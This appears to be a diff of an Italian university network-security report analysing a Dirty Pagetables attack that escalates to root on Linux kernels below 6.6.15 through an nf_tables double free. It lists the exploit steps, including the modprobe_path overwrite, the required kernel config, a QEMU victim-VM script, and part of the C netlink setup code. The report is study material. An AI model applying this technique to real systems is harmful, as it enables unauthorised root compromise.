@@ -64,7 +64,7 @@
 
   \vfill
 
-  {\textbf{\textit{\LARGE Analysis of a Linux KSMA using Dirty Pagetables}}}
+  {\textbf{\textit{\LARGE A KSMA using Dirty Pagetables in Linux}}}
   \\[2cm]
 
   {\textbf{\textit{\Large Progetto di Network Security}}}
@@ -86,9 +86,9 @@
 \newpage
 
 \section*{Introduzione}
-Oggigiorno, i classici esempi di attacchi alla memoria di un sistema operativo prevedono
+I classici esempi di attacchi alla memoria di un sistema operativo prevedono
 l'utilizzo del linguaggio C per la sua versatilità e la disattivazione di tutte le protezioni 
-statiche e dinamiche offerte sia dai compilatori sia dai sistemi operativi. Infatti, tutti i
+statiche e dinamiche. Infatti, tutti i
 moderni sistemi adottano protezioni come la randomizzazione dello stack, la separazione 
 dell'area dati (non eseguibile) da quella istruzioni e in alcune architetture \textbf{ARM} 
 è anche presente la possibilità di avere un registro dedicato a contenere una copia 
@@ -101,16 +101,9 @@ Un'altra classe di attacchi sono quelli che sfruttano le vulnerabilità di \text
 concorrenti e asincroni, possono essere suscettibili a tali vulnerabilità che però diventano 
 difficili da sfruttare perchè viene introdotto il fattore \textbf{tempo}. In questo caso, 
 gli attacchi diventano probabilistici in quanto non è possibile prevedere esattamente come 
-sono allocate le linee di cache in un processore e nemmeno quanto tempo passa quando un
-potenziale double possa essere sfruttato perchè la deallocazione può avvenire in 
+sono allocate le linee di cache in un processore e nemmeno quanto tempo passa perchè un
+potenziale double-free possa essere sfruttato perchè la deallocazione può avvenire in 
 contemporanea in altre applicazioni e può essere soggetta a operazioni di \textbf{quarantena}. 
-
-Tuttavia, le moderne protezioni per questo tipo di attacco sono presenti solamente come strumento 
-di testing, ma sono impraticabili dal punto di vista pratico in quanto si basano sull'instrumentazione 
-del codice che può portare ad una degradazione delle performance (sia dal punto di vista 
-di memoria utilizzata che dal throughput del sistema) di diversi ordini di grandezza. 
-Linux, su cui si basa questo progetto, mette a disposizione strumenti avanzati quali 
-\textbf{\textit{KMSAN, KASAN e KCMSAN}}. 
 
 Il progetto analizza una tecnica detta Dirty Pagetables che viene utilizzata per effettuare 
 attacchi avanzati alla memoria gestita dal kernel Linux e che, unita ad altre strategie, ha 
@@ -124,10 +117,10 @@ controllare la validità delle free list nel PCP.
 \section{Concetti utilizzati}\label{s:basics}
 \subsection{Gestione delle memoria in Linux}
 I moderni sistemi operativi utilizzano la memoria virtuale per garantire ad ogni processo 
-uno spazio di indirizzamento che non dipende dagli altri processi attualmente in esecuzione. 
+uno spazio di indirizzamento che non dipende dagli altri programmi in esecuzione. 
 
 Il kernel Linux è responsabile per l'allocazione delle pagine fisiche e lo fa attraverso 
-diversi allocatori. In particolare, il kernel lavora con indirizzi virtuali formattati come 
+diversi allocatori. In particolare, esso lavora con indirizzi virtuali formattati come 
 in \cref{fig:linux_va} \cite{LinuxDocs}.
 
 \begin{figure}[h]
@@ -640,16 +633,186 @@ static void do_unshare()
 Come illustrato in \cref{s:basics}, l'attacco prevede tre 
 passi fondamentali:
 \begin{itemize}
-  \item setup del namespace e delle tabelle netfilter;
-  \item trigger del double free con pacchetti IP frammentati;
-  \item sovrascrittura delle pagine;
+  \item setup del namespace e delle tabelle netfilter (\cref{fig:poc-1});
+  \item trigger del double free con pacchetti IP frammentati (\cref{fig:poc-2});
+  \item corruzione della free-list della cpu su cui si trova l'ultimo frammento IP ed allocazione 
+    della pagina malevola (\cref{fig:poc-3});
+  \item sovrascrittura della variabile modprobe\_path per eseguire un programma come root 
+    (una shell) (\cref{fig:poc-4});
 \end{itemize}
 Un PoC che sfrutta la vulnerabilità è presente in \cite{ExploitPoC}.
-\subsection{Preparazione del kernel}
 
+\begin{figure}[h]
+  \begin{center}
+    \includegraphics[width=.25\textwidth]{figures/ch1/poc-1.png}
+  \end{center}
+  \caption{Prima parte dell'exploit}\label{fig:poc-1}
+\end{figure}
+
+\begin{figure}[h]
+  \begin{center}
+    \includegraphics[width=.3\textwidth]{figures/ch1/poc-2.png}
+  \end{center}
+  \caption{Invio dei pacchetti UDP e trigger del double free}\label{fig:poc-2}
+\end{figure}
+
+\begin{figure}[h]
+  \begin{center}
+    \includegraphics[width=.15\textwidth]{figures/ch1/poc-3.png}
+  \end{center}
+  \caption{Applicazione della dirty pagetable}\label{fig:poc-3}
+\end{figure}
+
+\begin{figure}[h]
+  \begin{center}
+    \includegraphics[width=.15\textwidth]{figures/ch1/poc-4.png}
+  \end{center}
+  \caption{Sovrascrittura della variabile modprobe\_path ed esecuzione del codice arbitrario}\label{fig:poc-4}
+\end{figure}
+
+\clearpage
+\subsection{Preparazione del kernel}
+Per trovare una versione su cui l'exploit funziona è necessario avere a disposizione il codice 
+sorgente del kernel Linux ed essere dotati di una toolchain GNU. Per far si che l'exploit 
+funzioni, bisogna avere una versione del kernel inferiore alla $6.6.15$ e bisogna abilitare 
+nf\_tables e i namespace utente attraverso le configurazioni:
+\begin{verbatim}
+CONFIG_USER_NS=y 
+CONFIG_NF_TABLES=y
+\end{verbatim}
+
+Per creare un ambiente realistico è stata creata una distribuzione debian attraverso 
+il comando \textbf{\textit{debootstrap}} utilizzato lo script di inizializzazione fornito 
+in syzkaller \cite{InitScripts}. Il kernel utilizzato per gli esperimenti è stato compilato 
+a partire dalla configurazione \textbf{\textit{kvm\_guest.config}} generato dalla seguente 
+coppia di comandi:
+
+\begin{verbatim}
+cd $KERNEL
+make defconfig
+make kvm_guest.config 
+\end{verbatim}
+
+Una volta compilato il kernel e costruita l'immagine è possibile eseguire la macchina virtuale 
+minimale attraverso lo script \textbf{startvm.sh} che semplicemente esegue un dominio QEMU.
+
+\begin{lstlisting}[language=bash,caption="Esecuzione della macchina virtuale vittima"]
+#/bin/bash
+KERNEL=linux
+IMAGE=debian
+
+qemu-system-x86_64 \
+	-m 2G \
+	-smp 2 \
+	-kernel $KERNEL/arch/x86/boot/bzImage \
+	-append "console=ttyS0 root=/dev/sda earlyprintk=serial net.ifnames=0" \
+	-drive file=$IMAGE/bullseye.img,format=raw \
+	-net user,host=10.0.2.10,hostfwd=tcp:127.0.0.1:10021-:22 \
+	-net nic,model=e1000 \
+	-enable-kvm \
+	-nographic \
+	-pidfile vm.pid \
+	2>&1 | tee vm.log 
+\end{lstlisting}
 \subsection{Configurazione kernel: socket Netlink}
+Le socket NETLINK sono un meccanismo di comunicazione inter-processo (IPC) in Linux che 
+permettono la comunicazione tra il kernel e gli utenti in spazio user. NETLINK viene utilizzato
+per vari scopi, inclusi la configurazione della rete e la gestione delle politiche di 
+sicurezza. All'interno dell'exploit le socket netlink sono utilizzate per interagire con 
+nf\_tables configurando le regole per il trigger del double free. 
+
+
+\begin{lstlisting}[language=C,style=CStyle,caption="Configurazione nftables attraverso la socket netlink"]
+void configure_nftables() {
+	struct mnl_socket *nl_sock;
+	struct nlmsghdr *nlh;
+	struct mnl_nlmsg_batch *batch;
+	char buf[MNL_SOCKET_BUFFER_SIZE];
+	uint32_t seq = time(NULL);
+	int ret, batching;
+	struct nftnl_table *t1;
+	struct nftnl_chain *c1;
+	struct nftnl_rule *r1;
+
+	printf("[*] setting up nftables...\n");
+
+	PRINTF_VERBOSE("[*] allocating netfilter objects...\n");
+	t1 = alloc_table(NFPROTO_IPV4, "filter");
+	c1 = alloc_chain(NFPROTO_IPV4, "filter", "df", NF_INET_PRE_ROUTING);
+	r1 = alloc_rule(NFPROTO_IPV4, "filter", "df", 70);
+
+	nl_sock = mnl_socket_open(NETLINK_NETFILTER);
+	if (nl_sock == NULL) {
+		perror("mnl_socket_open");
+		exit(EXIT_FAILURE);
+	}
+
+	if (mnl_socket_bind(nl_sock, 0, MNL_SOCKET_AUTOPID) < 0) {
+		perror("mnl_socket_bind");
+		exit(EXIT_FAILURE);
+	}
+
+	batching = nftnl_batch_is_supported();
+	if (batching < 0) {
+		printf("[!] can't comm with nfnetlink");
+		exit(EXIT_FAILURE);
+	}
+
+	batch = mnl_nlmsg_batch_start(buf, sizeof(buf));
+	if (batching) {
+		nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
+		mnl_nlmsg_batch_next(batch);
+	}
+
+    nlh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
+                                      NFT_MSG_NEWTABLE,
+                                      nftnl_table_get_u32(t1, NFTNL_TABLE_FAMILY), // Set the family here
+                                      NLM_F_APPEND|NLM_F_CREATE|NLM_F_ACK, seq++);
+
+    nftnl_table_nlmsg_build_payload(nlh, t1);
+    nftnl_table_free(t1);
+    mnl_nlmsg_batch_next(batch);
+
+	nlh = nftnl_chain_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
+									NFT_MSG_NEWCHAIN, 
+									nftnl_chain_get_u32(c1, NFTNL_CHAIN_FAMILY), 
+									NLM_F_APPEND|NLM_F_CREATE|NLM_F_ACK, seq++);
+
+	nftnl_chain_nlmsg_build_payload(nlh, c1);
+	nftnl_chain_free(c1);
+	mnl_nlmsg_batch_next(batch);
+
+	nlh = nftnl_rule_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
+									NFT_MSG_NEWRULE,
+									nftnl_rule_get_u32(r1, NFTNL_RULE_FAMILY),
+									NLM_F_APPEND|NLM_F_CREATE|NLM_F_ACK, seq++);
+
+	nftnl_rule_nlmsg_build_payload(nlh, r1);
+	nftnl_rule_free(r1);
+	mnl_nlmsg_batch_next(batch);
+
+	if (batching) {
+		nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
+		mnl_nlmsg_batch_next(batch);
+	}
+
+	PRINTF_VERBOSE("[*] sending nftables tables/chains/rules/expr using netlink...\n");
+	ret = mnl_socket_sendto(nl_sock, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch));
+  // other stuff...
+}
+
+\end{lstlisting}
 
 \subsection{Exploit della vulnerabilità}
+L'exploit viene compilato con \textbf{\textit{musl-gcc}} per avere un binario statico. 
+In \cref{fig:exploit}, è mostrato l'output che si ottiene quando si esegue l'attacco.
+\begin{figure}[h]
+  \begin{center}
+    \includegraphics[width=.65\textwidth]{figures/ch2/exploit.png}
+  \end{center}
+  \caption{Esecuzione dell'attacco}\label{fig:exploit}
+\end{figure}
+
 
 \clearpage
 
